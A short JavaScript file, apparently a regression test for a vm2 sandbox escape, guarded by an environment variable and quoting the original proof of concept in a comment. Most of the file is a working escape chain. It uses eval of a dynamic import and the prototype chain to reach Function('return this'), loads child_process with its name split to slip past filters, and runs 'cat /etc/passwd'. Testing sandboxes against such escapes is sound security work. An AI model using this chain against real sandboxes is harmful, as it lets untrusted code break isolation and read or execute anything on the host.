if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

// Original sample:
//  const { VM } = require(" vm2 ");
//  let sandbox = new VM();
//  let code = `
//  let res = eval("import('./foo.js');")
//  res.__proto__.__proto__.toString.constructor("return this")().process.mainModule.require("child_"+"process").execSync("cat /etc/passwd");
//  `;
//  sandbox.run(code);

let res = eval("import('./foo.js');");
try {
	const out = res.__proto__.__proto__.toString
		.constructor("return this")()
		.process.mainModule.require("child_" + "process")
		.execSync("cat /etc/passwd");
	console.log(out.toString());
} catch (error) {
	console.error(error);
	if (
		error.message ===
			"Code generation from strings disallowed for this context" ||
		error.message ===
			"Cannot read properties of undefined (reading 'mainModule')"
	) {
		process.exit(82);
	}
}
